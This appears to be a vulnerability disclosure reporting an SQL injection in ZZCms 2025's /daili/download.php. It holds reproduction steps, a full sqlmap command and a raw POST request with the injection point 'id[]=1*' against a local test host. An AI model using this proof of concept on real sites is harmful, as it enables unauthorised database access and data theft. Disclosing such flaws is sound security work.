 ZZCms 2025 has a SQL Injection vulnerability
##### Vulnerability Location: /daili/download.php 
##### Affected Range: ZZCms 2025
##### Vulnerability Cause: download.php contains an SQL injection vulnerability, which enables accounts with ordinary user privileges to access database information through this account.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions; Obtain data from other databases;
##### Link: http://www.zzcms.net/
# Vulnerability recurrence

First, register an account and select the registration type as: Company. When filling in the company name, keywords such as "biological" should be included

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/df1580f0-6d5a-4022-9758-77276fcdd840" />

Log in to the created account and obtain the identity proof. Visit later: /daili/download.php 

<img width="1430" height="308" alt="image" src="https://github.com/user-attachments/assets/69311127-4132-4339-8be6-c08e37ea340e" />

Capture the data packet, convert it to the POST mode, and add the id parameter.Using SQLMAP:

<img width="1895" height="937" alt="image" src="https://github.com/user-attachments/assets/d00504b6-4358-478d-9ff0-ecc231e34f58" />

sqlmap command: python sqlmap.py -r 1.txt --level 5 --risk 3 --dbms=Mysql --current-user --batch

Data packet:
```
POST /daili/download.php HTTP/1.1
Host: 127.0.0.1:8081
sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: __51cke__=; PHPSESSID=1lgihann99he0kns9hofshtqll; UserName=admin1; PassWord=e00cf25ad42683b3df678c61f42c6bda; __tins__713776=%7B%22sid%22%3A%201758106876159%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201758109216370%7D; __51laig__=5
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

id[]=1*
```
# Code Analysis

In download.php, the id parameter is of array type.

<img width="1094" height="488" alt="image" src="https://github.com/user-attachments/assets/1af13a98-256d-45e4-9a45-1056ef488825" />

The parameters passed by the user have not been filtered.

<img width="1083" height="591" alt="image" src="https://github.com/user-attachments/assets/e6577d47-b01c-4acc-b0b1-0dc0bbe23c17" />
